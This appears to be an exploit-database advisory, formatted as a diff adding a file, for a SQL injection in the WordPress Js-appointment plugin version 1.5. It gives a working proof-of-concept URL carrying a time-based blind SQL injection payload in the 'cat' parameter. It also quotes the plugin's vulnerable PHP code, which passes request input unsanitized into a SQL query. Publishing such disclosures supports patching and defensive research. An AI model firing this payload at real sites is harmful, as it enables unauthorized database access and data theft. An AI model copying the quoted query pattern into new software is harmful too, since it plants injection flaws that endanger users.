@@ -1,0 +1,31 @@
+# Exploit Title: WordPress Js-appointment plugin <= 1.5 SQL Injection Vulnerability
+# Date: 2011-08-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/js-appointment.1.5.zip
+# Version: 1.5 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/js-appointment/searchdata.php?search_action=searchadv&cat=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+if (!empty($_REQUEST['search_action'])) {
+	switch($_REQUEST['search_action']) {
+		case 'searchadv':
+    require_once(PLUGIN_PATH_ALLBOOK."/libs/class.book.php");
+    $settings = allbook_get_settings();
+
+    if ($_REQUEST["cat"]) {
+    $category = $_REQUEST["cat"];
+    } else {
+    $settings = allbook_get_settings();
+    $category = $settings['allbook_catinit'];
+      }
+	//$times = create_time_range($settings['allbook_datastart'], $settings['allbook_dataend'], $settings['allbook_datarange']);
+   $categoryquery = mysql_query("SELECT * FROM wp_resservation_cat WHERE id= '".$category."'");
+   $rowcategory = mysql_fetch_array( $categoryquery );
+...
